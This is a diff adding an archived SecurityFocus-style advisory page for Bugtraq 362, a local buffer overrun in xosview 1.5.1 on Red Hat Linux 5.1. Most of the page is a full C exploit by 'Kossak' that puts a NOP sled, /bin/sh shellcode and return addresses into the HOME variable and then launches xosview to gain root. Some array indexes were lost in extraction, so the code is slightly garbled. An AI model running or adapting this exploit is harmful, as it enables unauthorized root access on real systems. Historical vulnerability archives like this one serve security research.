@@ -1,0 +1,101 @@
+<p><b><span style="font-size: 18pt;">Linux xosview Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/362/info">info</a><br><a href="http://www.securityfocus.com/bid/362/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/362/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/362/solution">solution</a><br><a href="http://www.securityfocus.com/bid/362/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				362
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 28 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 28 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Chris Evans &lt;chris@FERRET.LMH.OX.AC.UK&gt; on May 28, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Redhat Linux 5.1 <br/>
+<span class="related">
+						
+							-
+						
+						Standard &amp; Poors ComStock 4.2.4 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 * xosview 1.5.1 buffer overrun exploit<br/><br/> * brought to you by Kossak (ldvg@rnl.ist.utl.pt)<br/><br/> *<br/><br/> * yep, this is a shameless rip from Aleph's tutorials, but it sure<br/><br/> * works... Lets keep those exploits coming!! :)<br/><br/> * Thanks to Chris Evans for posting the bug.<br/><br/> */<br/><br/> /* NOTE!!! xosview needs an open X display for this to work, so remember<br/><br/> * to modify the source (line 62), with your ip.<br/><br/> * The offset and buffer size work with me fine, but you might need to<br/><br/> * change them.<br/><br/> */<br/><br/> #include &lt;stdlib.h&gt;<br/><br/> #define DEFAULT_OFFSET 1150<br/><br/> #define DEFAULT_BUFFER_SIZE 3500<br/><br/> #define NOP 0x90<br/><br/> char shellcode =<br/><br/> "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/><br/> "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/><br/> "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/><br/> unsigned long get_sp(void) {<br/><br/> __asm__("movl %esp,%eax");<br/><br/> }<br/><br/> void main(int argc, char *argv) {<br/><br/> char *buff, *ptr;<br/><br/> long *addr_ptr, addr;<br/><br/> int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<br/><br/> int i;<br/><br/> if (!(buff = malloc(bsize))) {<br/><br/> printf("Can't allocate memory.\n");<br/><br/> exit(0);<br/><br/> }<br/><br/> addr = get_sp() - offset;<br/><br/> printf("xosview exploit by Kossak\n");<br/><br/> printf("try changing the default values if you dont get root now.\n");<br/><br/> printf("Using address: 0x%x\n", addr);<br/><br/> ptr = buff;<br/><br/> addr_ptr = (long *) ptr;<br/><br/> for (i = 0; i &lt; bsize; i+=4)<br/><br/> *(addr_ptr++) = addr;<br/><br/> for (i = 0; i &lt; bsize/2; i++)<br/><br/> buffi = NOP;<br/><br/> ptr = buff + ((bsize/2) - (strlen(shellcode)/2));<br/><br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/><br/> *(ptr++) = shellcodei;<br/><br/> buffbsize - 1 = '\0';<br/><br/> setenv("HOME", buff, 1);<br/><br/> system("/usr/bin/X11/xosview -display 0:0"); /* your IP here */<br/><br/> }
+	
+		<ul>
+</ul>
+</div>
